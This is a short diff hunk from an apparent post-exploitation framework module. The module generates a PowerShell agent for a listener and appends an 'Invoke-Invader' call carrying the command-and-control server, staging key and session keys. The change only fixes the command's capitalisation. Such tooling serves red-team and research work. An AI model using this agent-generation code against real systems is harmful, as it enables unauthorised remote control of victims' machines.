@@ -87,7 +87,7 @@ class Module:
         agentCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_agent(activeListener['options'], language=language)
 
         if language.lower() == 'powershell':
-            agentCode += "\nInvoke-invader -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (host, stagingKey, sessionKey, sessionID)
+            agentCode += "\nInvoke-Invader -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (host, stagingKey, sessionKey, sessionID)
         else:
             print helpers.color('[!] Only PowerShell agent generation is supported at this time.')
             return ''
